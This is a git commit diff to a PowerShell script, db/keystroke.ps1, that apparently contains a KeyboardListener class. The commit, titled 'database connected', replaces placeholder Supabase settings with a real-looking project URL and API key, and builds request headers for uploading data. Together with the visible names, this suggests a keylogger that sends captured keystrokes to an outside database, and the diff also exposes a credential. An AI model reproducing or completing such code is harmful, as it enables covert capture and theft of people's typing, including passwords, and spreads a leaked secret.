6b7e36b136275ad56aabb85bbd327a6944427687
NotDumbj <145663898+NotDumbj@users.noreply.github.com>
2025-06-03 18:22:56 +0500

    database connected

--- db/keystroke.ps1
+++ db/keystroke.ps1
@@ -8,8 +8,8 @@ public class KeyboardListener {
 "@
 
 # Supabase setup
-$SUPABASE_URL = "https://your-project.supabase.co"
-$SUPABASE_KEY = "your-anon-key"
+$SUPABASE_URL = "https://vxevbehqnjhqodybymto.supabase.co"
+$SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InZ4ZXZiZWhxbmpocW9keWJ5bXRvIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NDg5NTYzNDYsImV4cCI6MjA2NDUzMjM0Nn0.BHAltakl2-UqwFjMFvKJYIWw9NcZ064N5BWt1Z6uyiE"
 $headers = @{
     "apikey"        = $SUPABASE_KEY
     "Authorization" = "Bearer $SUPABASE_KEY"
